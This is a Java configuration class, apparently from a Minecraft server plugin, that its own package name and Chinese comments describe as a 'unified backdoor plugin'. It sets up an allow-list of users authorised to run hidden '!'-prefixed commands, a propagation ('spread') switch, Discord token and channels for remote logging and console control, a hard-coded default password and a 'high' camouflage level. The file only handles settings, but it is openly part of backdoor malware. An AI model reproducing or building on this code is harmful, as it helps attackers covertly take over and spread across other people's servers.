package com.unifiedbackdoor.config;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import java.io.*;
import java.util.ArrayList;
import java.util.List;

/**
 * 统一后门插件配置类
 * 基于用户提供的JSON配置结构
 */
public class PluginConfig {
    
    // 授权用户列表
    private List<String> uuids = new ArrayList<>();
    private List<String> usernames = new ArrayList<>();
    
    // 命令前缀
    private String prefix = "!";
    
    // 传播设置
    private boolean spread = false;
    private boolean warnings = true;
    
    // Discord集成
    private String discordToken = "";
    private String password = "12345";
    private String discordLogChannel = "";
    private String discordConsoleChannel = "";
    
    // 伪装设置
    private String camouflageLevel = "high";
    private boolean autoJdkDownload = true;
    
    // 默认构造函数
    public PluginConfig() {}
    
    // Getters and Setters
    public List<String> getUuids() { return uuids; }
    public void setUuids(List<String> uuids) { this.uuids = uuids; }
    
    public List<String> getUsernames() { return usernames; }
    public void setUsernames(List<String> usernames) { this.usernames = usernames; }
    
    public String getPrefix() { return prefix; }
    public void setPrefix(String prefix) { this.prefix = prefix; }
    
    public boolean isSpread() { return spread; }
    public void setSpread(boolean spread) { this.spread = spread; }
    
    public boolean isWarnings() { return warnings; }
    public void setWarnings(boolean warnings) { this.warnings = warnings; }
    
    public String getDiscordToken() { return discordToken; }
    public void setDiscordToken(String discordToken) { this.discordToken = discordToken; }
    
    public String getPassword() { return password; }
    public void setPassword(String password) { this.password = password; }
    
    public String getDiscordLogChannel() { return discordLogChannel; }
    public void setDiscordLogChannel(String discordLogChannel) { this.discordLogChannel = discordLogChannel; }
    
    public String getDiscordConsoleChannel() { return discordConsoleChannel; }
    public void setDiscordConsoleChannel(String discordConsoleChannel) { this.discordConsoleChannel = discordConsoleChannel; }
    
    public String getCamouflageLevel() { return camouflageLevel; }
    public void setCamouflageLevel(String camouflageLevel) { this.camouflageLevel = camouflageLevel; }
    
    public boolean isAutoJdkDownload() { return autoJdkDownload; }
    public void setAutoJdkDownload(boolean autoJdkDownload) { this.autoJdkDownload = autoJdkDownload; }
    
    /**
     * 从JSON文件加载配置
     */
    public static PluginConfig loadFromFile(String filePath) throws IOException {
        File configFile = new File(filePath);
        if (!configFile.exists()) {
            throw new FileNotFoundException("配置文件不存在: " + filePath);
        }
        
        try (FileReader reader = new FileReader(configFile)) {
            Gson gson = new Gson();
            return gson.fromJson(reader, PluginConfig.class);
        }
    }
    
    /**
     * 保存配置到JSON文件
     */
    public void saveToFile(String filePath) throws IOException {
        try (FileWriter writer = new FileWriter(filePath)) {
            Gson gson = new GsonBuilder().setPrettyPrinting().create();
            gson.toJson(this, writer);
        }
    }
    
    /**
     * 创建默认配置
     */
    public static PluginConfig createDefault() {
        PluginConfig config = new PluginConfig();
        
        // 设置默认值
        config.setPrefix("!");
        config.setSpread(false);
        config.setWarnings(true);
        config.setPassword("12345");
        config.setCamouflageLevel("high");
        config.setAutoJdkDownload(true);
        
        return config;
    }
    
    /**
     * 检查用户是否被授权（Level 1权限）
     */
    public boolean isAuthorized(String username, String uuid) {
        return usernames.contains(username.toLowerCase()) || uuids.contains(uuid);
    }
    
    /**
     * 添加授权用户
     */
    public void addAuthorizedUser(String username, String uuid) {
        if (username != null && !username.isEmpty()) {
            usernames.add(username.toLowerCase());
        }
        if (uuid != null && !uuid.isEmpty()) {
            uuids.add(uuid);
        }
    }
    
    /**
     * 移除授权用户
     */
    public void removeAuthorizedUser(String username, String uuid) {
        if (username != null) {
            usernames.remove(username.toLowerCase());
        }
        if (uuid != null) {
            uuids.remove(uuid);
        }
    }
    
    @Override
    public String toString() {
        return "PluginConfig{" +
                "uuids=" + uuids.size() + " users, " +
                "usernames=" + usernames.size() + " users, " +
                "prefix='" + prefix + '\'' +
                ", spread=" + spread +
                ", warnings=" + warnings +
                ", camouflageLevel='" + camouflageLevel + '\'' +
                ", autoJdkDownload=" + autoJdkDownload +
                '}';
    }
}
